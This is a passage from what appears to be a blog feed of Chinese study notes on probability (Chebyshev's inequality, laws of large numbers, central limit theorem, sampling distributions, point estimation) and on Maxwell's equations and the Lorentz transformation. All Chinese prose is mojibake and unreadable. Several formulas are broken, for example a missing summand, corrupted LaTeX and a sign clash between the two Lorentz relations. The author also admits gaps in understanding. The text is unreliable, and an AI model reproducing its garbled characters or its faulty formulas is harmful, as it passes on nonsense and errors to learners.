P{ \left\vert Y \right\vert \ge \epsilon } \newline~ \newline<br>\therefore P{ \left\vert Y \right\vert \epsilon } &#x3D; \frac{E(Z^k)}{\epsilon^k} \le \frac{E( \left\vert Y \right\vert ^k )}{\epsilon^k}}<br>$$</p><h3 id="åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼"><a href="#åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼" class="headerlink" title="åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼"></a>åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼</h3><p>è®¾ X çš„æ–¹å·® $Var(X)$ å­˜åœ¨ï¼Œåˆ™å¯¹äºä»»æ„ $\epsilon &gt; 0$, éƒ½æœ‰:<br>$$<br>\displaylines{P{ \left\vert X - E(X) \right\vert \ge \epsilon } \le \frac{Var(X)}{\epsilon^2}}<br>$$</p><p>ç­‰ä»·äº:<br>$$<br>\displaylines{P{ \left\vert X - E(X) \right\vert &lt; \epsilon } \ge 1 - \frac{Var(X)}{\epsilon^2}}<br>$$</p><h2 id="å‡ ä¸ªå¤§æ•°å®šå¾‹"><a href="#å‡ ä¸ªå¤§æ•°å®šå¾‹" class="headerlink" title="å‡ ä¸ªå¤§æ•°å®šå¾‹"></a>å‡ ä¸ªå¤§æ•°å®šå¾‹</h2><h3 id="å¼±å¤§æ•°å®šå¾‹"><a href="#å¼±å¤§æ•°å®šå¾‹" class="headerlink" title="å¼±å¤§æ•°å®šå¾‹"></a>å¼±å¤§æ•°å®šå¾‹</h3><p>è®¾ $Y_1, â€¦, Y_n,â€¦$ ä¸ºä¸€ä¸ªéšæœºå˜é‡åºåˆ—ï¼Œè‹¥å­˜åœ¨å¸¸æ•°åºåˆ—ï¼Œä½¿å¾—å½“<br>$$<br>\displaylines{n \rightarrow +\infty, \ \frac{1}{n} \sum_{i&#x3D;1}^n Y_i - c_n \overset{P}{\longrightarrow} 0 \newline~ \newline<br>å³\ \forall \epsilon &gt; 0, æœ‰ \newline~ \newline<br>\lim_{n \rightarrow \infty} P{ \left\vert \frac{1}{n} \sum_{i&#x3D;1}^n Y_i - c_n \right\vert \ge \epsilon } &#x3D; 0}<br>$$</p><p>åˆ™ç§° ${ Y_i, i \ge 1 }$ æœä»å¼±å¤§æ•°å®šå¾‹.</p><p>å½“ $c_n &#x3D; c, \ n&#x3D;1,2,â€¦$ æ—¶ï¼Œå¯å†™ä¸º:<br>$$<br>\displaylines{ \frac{1}{n} \sum_{i&#x3D;1}^n Y_i \overset{P}{\longrightarrow} c, n \rightarrow + \infty}<br>$$</p><h3 id="åˆ‡æ¯”é›ªå¤«å¤§æ•°å®šå¾‹"><a href="#åˆ‡æ¯”é›ªå¤«å¤§æ•°å®šå¾‹" class="headerlink" title="åˆ‡æ¯”é›ªå¤«å¤§æ•°å®šå¾‹"></a>åˆ‡æ¯”é›ªå¤«å¤§æ•°å®šå¾‹</h3><p>è®¾ $X_1, X_2, â€¦, X_n,â€¦$ ç›¸äº’ç‹¬ç«‹ï¼Œå…·æœ‰ç›¸åŒçš„æ•°å­¦æœŸæœ› $\mu$ å’Œç›¸åŒçš„æ–¹å·® $\sigma^2$, åˆ™å½“:<br>$$<br>\displaylines{n \rightarrow + \infty \ æ—¶, \ \frac{1}{n} \sum_{k&#x3D;1}^n \overset{P}{\longrightarrow} \mu}<br>$$</p><blockquote><p>è¯æ˜</p></blockquote><p>$$<br>\displaylines{\because E( \frac{1}{n} \sum_{i&#x3D;1}^n X_i ) &#x3D; \frac{1}{n} \sum_{i&#x3D;1}^n E(X_i) &#x3D; \mu \newline~ \newline<br>Var( \frac{1}{n} \sum_{i&#x3D;1}^n X_i ) &#x3D; \frac{1}{n^2} Var( \sum_{i&#x3D;1}^n X_i ) &#x3D; \frac{1}{n^2} \sum_{i&#x3D;1}^n Var(X_i) &#x3D; \frac{\sigma^2}{n} \newline~ \newline<br>åˆ©ç”¨åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼: \newline~ \newline<br>0 \le P( \left\vert \frac{1}{n} \sum_{i&#x3D;1}^n X_i - \mu \right\vert \ge \epsilon ) \le \frac{Var( \frac{1}{n} \sum_{i&#x3D;1}^n X_i )}{\epsilon^2} &#x3D; \frac{\sigma^2}{n \epsilon^2} \rightarrow 0}<br>$$</p><h3 id="è¾›é’¦å¤§æ•°å®šç†"><a href="#è¾›é’¦å¤§æ•°å®šç†" class="headerlink" title="è¾›é’¦å¤§æ•°å®šç†"></a>è¾›é’¦å¤§æ•°å®šç†</h3><p>è®¾ $X_1, X_2, â€¦, X_n,â€¦$ ç‹¬ç«‹åŒåˆ†å¸ƒ:<br>$$<br>\displaylines{E(X_i) &#x3D; \mu, \newline~ \newline<br>åˆ™å½“ \ \ n \rightarrow + \infty \newline~ \newline<br>\frac{1}{n} \sum_{i&#x3D;1}^n X_i \overset{P}{\longrightarrow} \mu}<br>$$</p><blockquote><p>æ¨è®º</p></blockquote><p>è®¾ $X_1, X_2, â€¦, X_n,â€¦$ ç‹¬ç«‹åŒåˆ†å¸ƒ, è‹¥ $h(x)$ æ˜¯è¿ç»­å‡½æ•°ï¼Œ $E(h(X_1)) &#x3D; a$ å­˜åœ¨ï¼Œåˆ™å½“:<br>$$<br>\displaylines{n \rightarrow + \infty \newline~ \newline<br>\frac{1}{n} \sum_{i&#x3D;1}^n h(X_i) \overset{P}{\longrightarrow} a}<br>$$</p><h3 id="è´åŠªåˆ©å¤§æ•°å®šç†"><a href="#è´åŠªåˆ©å¤§æ•°å®šç†" class="headerlink" title="è´åŠªåˆ©å¤§æ•°å®šç†"></a>è´åŠªåˆ©å¤§æ•°å®šç†</h3><p>è®¾ $n_A$ ä¸º n é‡è´åŠªåˆ©è¯•éªŒä¸­äº‹ä»¶ A å‘ç”Ÿçš„æ¬¡æ•°ï¼Œå¹¶è®°äº‹ä»¶ A åœ¨æ¯æ¬¡è¯•éªŒä¸­å‘ç”Ÿçš„æ¦‚ç‡ä¸º p, åˆ™æœ‰:<br>$$<br>\displaylines{å½“ n \rightarrow + \infty \ æ—¶ \newline~ \newline<br>\frac{n_A}{n} \overset{P}{\longrightarrow} p}<br>$$</p><blockquote><p>è¯æ˜</p></blockquote><p>å¯åˆ©ç”¨åˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼.</p><h2 id="ä¸­å¿ƒæé™å®šç†"><a href="#ä¸­å¿ƒæé™å®šç†" class="headerlink" title="ä¸­å¿ƒæé™å®šç†"></a>ä¸­å¿ƒæé™å®šç†</h2><h3 id="ç‹¬ç«‹åŒåˆ†å¸ƒçš„ä¸­å¿ƒæé™å®šç†"><a href="#ç‹¬ç«‹åŒåˆ†å¸ƒçš„ä¸­å¿ƒæé™å®šç†" class="headerlink" title="ç‹¬ç«‹åŒåˆ†å¸ƒçš„ä¸­å¿ƒæé™å®šç†"></a>ç‹¬ç«‹åŒåˆ†å¸ƒçš„ä¸­å¿ƒæé™å®šç†</h3><p>è®¾ $X_1, X_2, â€¦, X_n,â€¦$ ç‹¬ç«‹åŒåˆ†å¸ƒ:</p><p>$$<br>\displaylines{E(X_i) &#x3D; \mu,\ \ Var(X_i) &#x3D; \sigma^2 \newline~ \newline<br>åˆ™å¯¹ä»»æ„å®æ•° x \newline~ \newline<br>\lim_{n \rightarrow \infty} P( \frac{\sum_{i&#x3D;1}^n X_i - n \mu}{\sqrt{n} \sigma} \le x ) &#x3D; \int_{- \infty}^x \frac{1}{sqrt{2 \pi}} e^{- \frac{t^2}{2}} dt &#x3D; \phi (x)}<br>$$</p><p>n å……åˆ†å¤§æ—¶:<br>$$<br>\displaylines{\sum_{i&#x3D;1}^n X_i \overset{è¿‘ä¼¼}{\sim} N(n \mu, n \sigma^2) \newline~ \newline<br>\frac{1}{n} \sum_{i&#x3D;1}^n X_i \overset{è¿‘ä¼¼}{ã€sim} N(\mu, \frac{\sigma^2}{n})}<br>$$</p><blockquote><p>æ¨è®º  æ££è«å¼—â€“æ‹‰æ™®æ‹‰æ–¯ä¸­å¿ƒæé™å®šç†</p></blockquote><p>è®¾ $n_A$ ä¸º n é‡è´åŠªåˆ©è¯•éªŒä¸­äº‹ä»¶ A å‘ç”Ÿçš„æ¬¡æ•°ï¼Œ $P(A) &#x3D; p(0 &lt; p &lt; 1)$, åˆ™å¯¹ä»»ä½•å®æ•° x, æœ‰:<br>$$<br>\displaylines{\lim_{n \rightarrow +\infty} P( \frac{n_A - np}{\sqrt{np (1-p)}} \le x) &#x3D; \int_{-\infty}^{x} \frac{1}{sqrt{2 \pi}} e^{- \frac{t^2}{2}} dt &#x3D; \phi (x) \newline~ \newline<br>å³,\ \ B(n,p) \overset{è¿‘ä¼¼}{\sim} N(np,np(1-p))}<br>$$</p><h1 id="ç¬¬å…­ç« -ç»Ÿè®¡é‡ä¸æŠ½æ ·åˆ†å¸ƒ"><a href="#ç¬¬å…­ç« -ç»Ÿè®¡é‡ä¸æŠ½æ ·åˆ†å¸ƒ" class="headerlink" title="ç¬¬å…­ç«  ç»Ÿè®¡é‡ä¸æŠ½æ ·åˆ†å¸ƒ"></a>ç¬¬å…­ç«  ç»Ÿè®¡é‡ä¸æŠ½æ ·åˆ†å¸ƒ</h1><h2 id="éšæœºæ ·æœ¬ä¸ç»Ÿè®¡é‡"><a href="#éšæœºæ ·æœ¬ä¸ç»Ÿè®¡é‡" class="headerlink" title="éšæœºæ ·æœ¬ä¸ç»Ÿè®¡é‡"></a>éšæœºæ ·æœ¬ä¸ç»Ÿè®¡é‡</h2><p>å‡ ä¸ªæ¦‚å¿µ:</p><ul><li>æ€»ä½“: ç ”ç©¶å¯¹è±¡çš„å…¨ä½“</li><li>ä¸ªä½“: æ€»ä½“ä¸­çš„æˆå‘˜</li><li>æ€»ä½“çš„å®¹é‡: æ€»ä½“ä¸­åŒ…å«çš„ä¸ªä½“æ•°</li><li>æœ‰é™æ€»ä½“: å®¹é‡æœ‰é™çš„æ€»ä½“</li><li>æ— é™æ€»ä½“: å®¹é‡æ— é™çš„æ€»ä½“,é€šå¸¸å°†å®¹é‡éå¸¸å¤§çš„æ€»ä½“ä¹ŸæŒ‰æ— é™æ€»ä½“å¤„ç†</li></ul><p>æŒ‡æ ‡ X çœ‹ä½œæ˜¯ <mark>éšæœºå˜é‡</mark>.</p><p>æœ‰æ—¶æŠŠ <mark>X ç§°ä¸ºæ€»ä½“</mark> (X å°±æŒ‡ä»£ç ”ç©¶çš„å¯¹è±¡)</p><p>å‡è®¾ X çš„åˆ†å¸ƒå‡½æ•°ä¸º $F(x)$, ä¹Ÿç§° $F(x)$ ä¸ºæ€»ä½“.</p><p>ä»æ€»ä½“ä¸­è¢«æŠ½å–çš„éƒ¨åˆ†ä¸ªä½“å«åšæ€»ä½“çš„ä¸€ä¸ª <mark>æ ·æœ¬</mark> </p><p>å‡ ä¸ªæ¦‚å¿µ:</p><ul><li>éšæœºæ ·æœ¬: ä»æ€»ä½“ä¸­éšæœºåœ°å–nä¸ªä¸ªä½“, ç§°ä¸ºä¸€ä¸ªéšæœºæ ·æœ¬</li><li>ç®€å•éšæœºæ ·æœ¬: æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶çš„éšæœºæ ·æœ¬(X1,X2,â€¦,Xn)ç§°ä¸ºå®¹é‡æ˜¯nçš„ç®€å•éšæœºæ ·æœ¬<ol><li>ä»£è¡¨æ€§: æ¯ä¸ªXiä¸XåŒåˆ†å¸ƒ</li><li>ç‹¬ç«‹æ€§: X1,X2,â€¦,Xnæ˜¯ç›¸äº’ç‹¬ç«‹çš„éšæœºå˜é‡</li></ol></li></ul><blockquote><p>è·å–ç®€å•éšæœºæ ·æœ¬çš„æ–¹å¼</p></blockquote><p>æœ‰é™æ€»ä½“ $\rightarrow$ æ”¾å›æŠ½æ ·.</p><p>æ€»ä½“å®¹é‡å¤§ $\rightarrow$ ä¸æ”¾å›æŠ½æ ·è¿‘ä¼¼.</p><p>æ— é™æ€»ä½“ï¼Œä¸æ”¾å›æŠ½æ ·.</p><p>å‡ ä¸ªæ¦‚å¿µ:</p><ul><li>ç»Ÿè®¡é‡: æ ·æœ¬çš„ä¸å«ä»»ä½•æœªçŸ¥å‚æ•°çš„å‡½æ•°</li><li>å¸¸ç”¨ç»Ÿè®¡é‡:<ol><li>æ ·æœ¬å‡å€¼ $\overline{X} &#x3D; \frac{1}{n} \sum_{i&#x3D;1}^n X_i$</li><li>æ ·æœ¬æ–¹å·® $S^2 &#x3D; \frac{1}{ n - 1 }\sum_{i&#x3D;1}^n (X_i - \overline{X})^2$</li><li>æ ·æœ¬çŸ©</li></ol><ul><li>k é˜¶çŸ©: $A_k &#x3D; \frac{1}{n} \sum_{i&#x3D;1}^n X_i^k \ \ (k &#x3D; 1,2,â€¦)$</li><li>k é˜¶ä¸­å¿ƒçŸ©: $B_k &#x3D; \frac{1}{n}\sum_{i&#x3D;1}^n (X_i - \overline{X})^k \ \ (k &#x3D; 1,2,â€¦)$</li></ul></li></ul><h2 id="x-2-åˆ†å¸ƒ-t-åˆ†å¸ƒ-F-åˆ†å¸ƒ"><a href="#x-2-åˆ†å¸ƒ-t-åˆ†å¸ƒ-F-åˆ†å¸ƒ" class="headerlink" title="$x^2$ åˆ†å¸ƒ t åˆ†å¸ƒ F åˆ†å¸ƒ"></a>$x^2$ åˆ†å¸ƒ t åˆ†å¸ƒ F åˆ†å¸ƒ</h2><h3 id="x-2-åˆ†å¸ƒ"><a href="#x-2-åˆ†å¸ƒ" class="headerlink" title="$x^2$ åˆ†å¸ƒ"></a>$x^2$ åˆ†å¸ƒ</h3><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾éšæœºå˜é‡ $X_1, X_2, â€¦, X_n$ ç›¸äº’ç‹¬ç«‹ï¼Œ $X_i \sim N(0,1)\ \ (i&#x3D;1,2,â€¦,n)$, åˆ™ç§°:<br>$$<br>\displaylines{X^2 &#x3D; \sum_{i&#x3D;1}^n X_i^2}<br>$$</p><p>ä¸ºæœä» <mark>è‡ªç”±åº¦ä¸º n çš„ $X^2$ åˆ†å¸ƒ</mark>.</p><p>è®°ä¸º <mark> $X^2 \sim X^2 (n)$</mark> </p><p>(è‡ªç”±åº¦æŒ‡ç‹¬ç«‹å˜é‡ä¸ªæ•°. ç‹¬ç«‹äº†ï¼Œä¹Ÿå°±è‡ªç”±äº†)</p><blockquote><p>$x^2$ åˆ†å¸ƒ çš„æ¦‚ç‡å¯†åº¦å‡½æ•°</p></blockquote><p>è§ä¹¦.</p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>è®¾ $X^2 \sim X^2(n)$ åˆ™æœ‰ $E(X^2) &#x3D; n, \ Var(X^2) &#x3D; 2n$</li><li>è®¾ $Y_i \sim X^2(n_i), \ i&#x3D;1,2$, ä¸” $Y_1, Y_2$ ç›¸äº’ç‹¬ç«‹ï¼Œåˆ™æœ‰ $Y_1 + Y_2 \sim X^2(n_1 + n_2)$</li></ul><blockquote><p>æ¨å¹¿</p></blockquote><p>è‹¥ $Y_i \sim X^2(n_i), \ i&#x3D;1,2,â€¦m$, $Y_1, Y_2,â€¦ Y_m$ ç›¸äº’ç‹¬ç«‹ï¼Œåˆ™æœ‰ $\sum_{i&#x3D;1}^m Y_i \sim X^2(\sum_{i&#x3D;1}^m n_i)$</p><h3 id="t-åˆ†å¸ƒ"><a href="#t-åˆ†å¸ƒ" class="headerlink" title="t åˆ†å¸ƒ"></a>t åˆ†å¸ƒ</h3><p>è®¾ $X \sim N(0,1), \ Y \sim X^2(n)$, å¹¶ä¸”å‡è®¾ X,Y ç›¸äº’ç‹¬ç«‹ã€‚</p><p>åˆ™ç§°:<br>$$<br>\displaylines{T &#x3D; \frac{X}{\sqrt{ \frac{Y}{n} }}}<br>$$<br>æœä»è‡ªç”±åº¦ä¸º n çš„ t åˆ†å¸ƒ.</p><p>è®°ä¸º $T \sim t(n)$.</p><p>å¯†åº¦å‡½æ•°ç­‰è§ä¹¦.</p><h3 id="F-åˆ†å¸ƒ"><a href="#F-åˆ†å¸ƒ" class="headerlink" title="F åˆ†å¸ƒ"></a>F åˆ†å¸ƒ</h3><p>è®¾ $X \sim \chi^2(n_1), \ Y \sim \chi^2(n_2)$, ä¸” X,Y ç‹¬ç«‹ï¼Œåˆ™ç§°:<br>$$<br>\displaylines{éšæœºå˜é‡F &#x3D; \frac{ \frac{X}{n_1} }{ \frac{Y}{n_2} }}<br>$$<br>æœä»è‡ªç”±åº¦ä¸º $(n_1, n_2)$ çš„ F åˆ†å¸ƒ.</p><p>è®°ä¸º $F \sim F(n_1, n_2)$.</p><p>å…¶ä¸­ $n_1$ ç§°ä¸ºç¬¬ä¸€è‡ªç”±åº¦ï¼Œ $n_2$ ç§°ä¸ºç¬¬äºŒè‡ªç”±åº¦.</p><blockquote><p>æ€§è´¨</p></blockquote><p>$F \sim F(n_1, n_2) \ \ åˆ™ \ F^{-1} \sim F(n_2,n_1)$</p><p>å¯†åº¦å‡½æ•°ç­‰è§ä¹¦.</p><h2 id="æ­£æ€æ€»ä½“ä¸‹çš„æŠ½æ ·åˆ†å¸ƒ"><a href="#æ­£æ€æ€»ä½“ä¸‹çš„æŠ½æ ·åˆ†å¸ƒ" class="headerlink" title="æ­£æ€æ€»ä½“ä¸‹çš„æŠ½æ ·åˆ†å¸ƒ"></a>æ­£æ€æ€»ä½“ä¸‹çš„æŠ½æ ·åˆ†å¸ƒ</h2><p>è®¾$X_1, X_2, â€¦, X_n$ ä¸ºæ¥è‡ªæ­£æ€æ€»ä½“ $N(\mu, \sigma^2)$ çš„ç®€å•éšæœºæ ·æœ¬ï¼Œ $\overline{X}$ æ˜¯æ ·æœ¬å‡å€¼ï¼Œ $S^2$ æ˜¯æ ·æœ¬æ–¹å·®, åˆ™æœ‰:<br>$$<br>\displaylines{\overline{X} \sim N(\mu, \frac{\sigma^2}{n})}<br>$$</p><ul><li>$\frac{(n-1)S^2}{\sigma^2} \sim \chi^2(n-1)$</li><li>$\overline{X}$ ä¸ $S^2$ ç›¸äº’ç‹¬ç«‹</li></ul><h1 id="ç¬¬ä¸ƒç« -å‚æ•°ä¼°è®¡"><a href="#ç¬¬ä¸ƒç« -å‚æ•°ä¼°è®¡" class="headerlink" title="ç¬¬ä¸ƒç«  å‚æ•°ä¼°è®¡"></a>ç¬¬ä¸ƒç«  å‚æ•°ä¼°è®¡</h1><p><mark>å‚æ•°</mark>: åæ˜ æ€»ä½“æŸæ–¹é¢ç‰¹å¾çš„é‡.</p><p><mark>å‚æ•°ä¼°è®¡</mark>: å½“æ€»ä½“çš„å‚æ•°æœªçŸ¥æ—¶, éœ€è¦åˆ©ç”¨æ ·æœ¬å…¶ç»™å‡ºä¼°è®¡.</p><p>ä¸¤ç±»å‚æ•°ä¼°è®¡æ–¹æ³•:</p><ul><li>ç‚¹ä¼°è®¡</li><li>åŒºé—´ä¼°è®¡</li></ul><h2 id="å‚æ•°çš„ç‚¹ä¼°è®¡"><a href="#å‚æ•°çš„ç‚¹ä¼°è®¡" class="headerlink" title="å‚æ•°çš„ç‚¹ä¼°è®¡"></a>å‚æ•°çš„ç‚¹ä¼°è®¡</h2><p>è®¾æ€»ä½“ X æœ‰æœªçŸ¥å‚æ•° $\theta$.</p><p>$X_1, X_2, â€¦, X_n$ æ˜¯ X çš„ç®€å•éšæœºæ ·æœ¬.</p><p>æ„é€ åˆé€‚çš„ç»Ÿè®¡é‡ $\hat{\theta} &#x3D; \hat{\theta}($X_1, X_2, â€¦, X_n$)$ ç”¨æ¥ä¼°è®¡æœªçŸ¥å‚æ•° $\theta$, ç§° $\hat{\theta}$ ä¸ºå‚æ•° $\theta$ çš„ <mark>ç‚¹ä¼°è®¡é‡</mark> </p><p>å½“ç»™å®šæ ·æœ¬è§‚å¯Ÿå€¼ $X_1, X_2, â€¦, X_n$ æ—¶ï¼Œç§° $\hat{\theta} &#x3D; \hat{\theta}($X_1, X_2, â€¦, X_n$)$ ä¸ºå‚æ•° $\theta$ çš„ <mark>ç‚¹ä¼°è®¡å€¼</mark> .</p><p>å¸¸ç”¨çš„ç‚¹ä¼°è®¡æ³•:</p><ul><li><mark>çŸ©é˜µä¼°è®¡æ³•</mark> </li><li><mark>æå¤§ä¼¼ç„¶ä¼°è®¡æ³•</mark></li></ul><h3 id="çŸ©é˜µä¼°è®¡æ³•"><a href="#çŸ©é˜µä¼°è®¡æ³•" class="headerlink" title="çŸ©é˜µä¼°è®¡æ³•"></a>çŸ©é˜µä¼°è®¡æ³•</h3><p>æ„Ÿè§‰æœ‰ç‚¹å¤æ‚ï¼Œè¿™é‡Œå…ˆä¸è®°.</p><h3 id="æå¤§ä¼¼ç„¶ä¼°è®¡æ³•"><a href="#æå¤§ä¼¼ç„¶ä¼°è®¡æ³•" class="headerlink" title="æå¤§ä¼¼ç„¶ä¼°è®¡æ³•"></a>æå¤§ä¼¼ç„¶ä¼°è®¡æ³•</h3><p>è¿™ä¸ªä¾‹å­å¾ˆå¥½è¯´æ˜.</p><p><img src="/../img/max_sim_approx.png"></p><h2 id="ä¼°è®¡é‡çš„è¯„é€‰åŸåˆ™"><a href="#ä¼°è®¡é‡çš„è¯„é€‰åŸåˆ™" class="headerlink" title="ä¼°è®¡é‡çš„è¯„é€‰åŸåˆ™"></a>ä¼°è®¡é‡çš„è¯„é€‰åŸåˆ™</h2><p>ç”¨äºè¯„åˆ¤ä¼°è®¡é‡çš„å¥½å.</p>]]></content>
    
    
    <categories>
      
      <category>Probability</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„-Notes</title>
    <link href="/2022/12/07/%E9%BA%A6%E5%85%8B%E6%96%AF%E9%9F%A6%E6%96%B9%E7%A8%8B%E7%BB%84-Notes/"/>
    <url>/2022/12/07/%E9%BA%A6%E5%85%8B%E6%96%AF%E9%9F%A6%E6%96%B9%E7%A8%8B%E7%BB%84-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/103123189">å‚è€ƒ çŸ¥ä¹</a></p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ´›ä¼¦å…¹å˜æ¢-Notes</title>
    <link href="/2022/12/07/%E6%B4%9B%E4%BC%A6%E5%85%B9%E5%8F%98%E6%8D%A2-Notes/"/>
    <url>/2022/12/07/%E6%B4%9B%E4%BC%A6%E5%85%B9%E5%8F%98%E6%8D%A2-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/105732091">å‚è€ƒ çŸ¥ä¹</a></p><h1 id="å…ˆå¯¼çŸ¥è¯†-æ³¢é€Ÿå–å†³äºä»‹è´¨çš„é€Ÿåº¦ï¼Œè€Œä¸æ˜¯æ³¢æºçš„é€Ÿåº¦"><a href="#å…ˆå¯¼çŸ¥è¯†-æ³¢é€Ÿå–å†³äºä»‹è´¨çš„é€Ÿåº¦ï¼Œè€Œä¸æ˜¯æ³¢æºçš„é€Ÿåº¦" class="headerlink" title="å…ˆå¯¼çŸ¥è¯†: æ³¢é€Ÿå–å†³äºä»‹è´¨çš„é€Ÿåº¦ï¼Œè€Œä¸æ˜¯æ³¢æºçš„é€Ÿåº¦"></a>å…ˆå¯¼çŸ¥è¯†: æ³¢é€Ÿå–å†³äºä»‹è´¨çš„é€Ÿåº¦ï¼Œè€Œä¸æ˜¯æ³¢æºçš„é€Ÿåº¦</h1><p>å¦‚ä½ è·‘æ­¥æ—¶è¯´è¯ï¼Œå£°éŸ³çš„ä¼ æ’­é€Ÿåº¦å¹¶æ²¡æœ‰å˜ (ä½ æ˜¯æ³¢æºï¼Œç©ºæ°”æ˜¯ä»‹è´¨).</p><p>è€Œå¦‚æœä½ è¿é£è¯´è¯ï¼Œå£°éŸ³çš„ä¼ æ’­é€Ÿåº¦æˆ–å¢å¤§ (ä»‹è´¨çš„é€Ÿåº¦å˜å¤§)</p><h1 id="çœŸç©ºä¸­çš„å…‰é ä»€ä¹ˆä»‹è´¨ä¼ æ’­"><a href="#çœŸç©ºä¸­çš„å…‰é ä»€ä¹ˆä»‹è´¨ä¼ æ’­" class="headerlink" title="çœŸç©ºä¸­çš„å…‰é ä»€ä¹ˆä»‹è´¨ä¼ æ’­"></a>çœŸç©ºä¸­çš„å…‰é ä»€ä¹ˆä»‹è´¨ä¼ æ’­</h1><p>æ²¡æœ‰ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä»‹è´¨.</p><p>å…‰é€Ÿä¸ä¾¿çš„èƒŒåæ˜¯æˆ‘ä»¬ç›¸ä¿¡ç”µç£å­¦è§„å¾‹ä¸å›å› ä¸ºæƒ¯æ€§å‚è€ƒç³»çš„å˜åŒ–è€Œå˜åŒ–, å³éº¦å…‹æ–¯éŸ¦æ–¹ç¨‹ç»„åœ¨ä¸åŒæƒ¯æ€§ç³»ä¸‹ä¿æŒåŒæ ·çš„å½¢å¼ï¼Œæ–¹ç¨‹å†…çš„å¸¸æ•°ä¹Ÿä¿æŒä¸å˜.</p><h1 id="æ´›ä¼¦å…¹å˜æ¢çš„æ¨å¯¼"><a href="#æ´›ä¼¦å…¹å˜æ¢çš„æ¨å¯¼" class="headerlink" title="æ´›ä¼¦å…¹å˜æ¢çš„æ¨å¯¼"></a>æ´›ä¼¦å…¹å˜æ¢çš„æ¨å¯¼</h1><p>çœ‹å®Œåšæ–‡åä»æœ‰äº›ä¸ç†è§£, ä½†å¤§è‡´å¦‚ä¸‹:</p><blockquote><p>ä»åœ°é¢å‚è€ƒç³»è§‚å¯Ÿ</p></blockquote><p><img src="/../img/Lorentz_transformation_on_ground_reference.png"></p><p>é»‘è‰²åæ ‡ç³»æ˜¯ä½ ç«™åœ¨åœ°é¢ä¸Šçš„ä½ç½®ï¼Œè“è‰²åæ ‡ç³»æ˜¯ç«è½¦ï¼Œç«è½¦åœ¨ç»è¿‡ä½ æ—¶å‘å‰è¿›æ–¹å‘å‘å‡ºäº†ä¸€ä¸ªé—ªå…‰ï¼Œæ©™è‰²ç‚¹æ˜¯å…‰æºä½ç½® (æ­¤æ—¶ä¸å†é—ªå…‰). å…‰è¿åŠ¨ $t$ æ—¶é—´ååˆ°è¾¾çŸ³å¤´.</p><p>å…‰çš„åˆå§‹ä½ç½®æ˜¯é»‘è‰²åæ ‡ç³»åŸç‚¹ï¼Œç»ˆæ­¢ä½ç½®æ˜¯çŸ³å¤´:<br>$$<br>\displaylines{x &#x3D; ct}<br>$$</p><p>$vt$ æ˜¯ä½ å’Œç«è½¦çš„è·ç¦», $x - vt$ æ˜¯ç«è½¦å’ŒçŸ³å¤´çš„è·ç¦».</p><blockquote><p>ä»ç«è½¦å‚è€ƒç³»è§‚å¯Ÿ</p></blockquote><p>å…‰è¿åŠ¨ $t^\prime$ ååˆ°è¾¾çŸ³å¤´:</p><p><img src="/../img/Lorentz_transformation_on_train_reference.png"></p><p>å…‰çš„åˆå§‹ä½ç½®æ˜¯è“è‰²åæ ‡ç³»åŸç‚¹, å³ç«è½¦ï¼Œç»ˆæ­¢ä½ç½®æ˜¯çŸ³å¤´.</p><p>$$<br>\displaylines{x^\prime &#x3D; c t^\prime}<br>$$<br><mark>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒå‚è€ƒç³»ä¸‹ï¼Œèµ·å§‹ä½ç½®ä¸åŒï¼Œå¯¼è‡´è¿åŠ¨çš„è·ç¦»ä¸åŒ</mark> </p><blockquote><p>æ¯”è¾ƒç«è½¦åˆ°çŸ³å¤´çš„è·ç¦»çš„çŸ›ç›¾ä¹‹å¤„</p></blockquote><p>å¦‚æœä¸¤ä¸ªå¤±æ§çš„åº¦é‡ç›¸åŒï¼Œé‚£ä¹ˆç«è½¦åˆ°çŸ³å¤´çš„è·ç¦»æ˜¯ç›¸åŒçš„, å³:<br>$$<br>\displaylines{x-vt &#x3D; x^\prime \newline~ \newline ct - vt &#x3D; ct^\prime \newline~ \newline t &#x3D; t^\prime \newline~ \newline vt &#x3D; 0}<br>$$</p><p>ä½† $v$ å’Œ $t$ éƒ½ä¸ä¸€å®šä¸ºé›¶ (è¿™ä¸€éƒ¨åˆ†ä¸æ˜¯å¾ˆæ‡‚)</p><p>ä¸ºäº†è§£å†³çŸ›ç›¾ï¼Œçˆ±å› æ–¯å¦è®¤ä¸ºä¸¤ä¸ªæ—¶ç©ºçš„åº¦é‡ä¸åŒï¼Œåœ¨è¿™ä¸¤ä¸ªå‚è€ƒç³»ä¸‹è§‚å¯Ÿç«è½¦åˆ°çŸ³å¤´çš„è·ç¦»å·®äº†ä¸€ä¸ªçº¿æ€§çš„ç¼©æ”¾ç³»:<br>$$<br>\displaylines{x^\prime &#x3D; \gamma \cdot (x - vt) \newline~ \newline x &#x3D; \gamma \cdot (x^\prime + vt^\prime)}<br>$$</p><p>(å…¬å¼ä¸æ˜¯å¾ˆç†è§£)</p><blockquote><p>æ¨å¯¼ç»“è®º</p></blockquote><p>$$<br>\displaylines{<br>\begin{cases}<br>x^\prime &#x3D; \gamma \cdot (x - vt) \newline~ \newline<br>x &#x3D; \gamma \cdot (x^\prime - vt^\prime)<br>\end{cases}<br>}<br>$$</p><p>æ¨å¯¼è§åšæ–‡å§ï¼Œæ²¡æ€ä¹ˆç†è§£åˆ°è¿™é‡Œå°±ç›´æ¥å†™ç»“è®º:</p><blockquote><p>æ­£å˜æ¢<br>$$<br>\displaylines{<br>\begin{cases}<br>x^\prime &#x3D; \frac{x - vt}{\sqrt{1 - \frac{v^2}{c^2}}} \newline~ \newline<br>y^\prime &#x3D; y \newline~ \newline<br>z^\prime &#x3D; z \newline~ \newline<br>t^\prime &#x3D; \frac{ 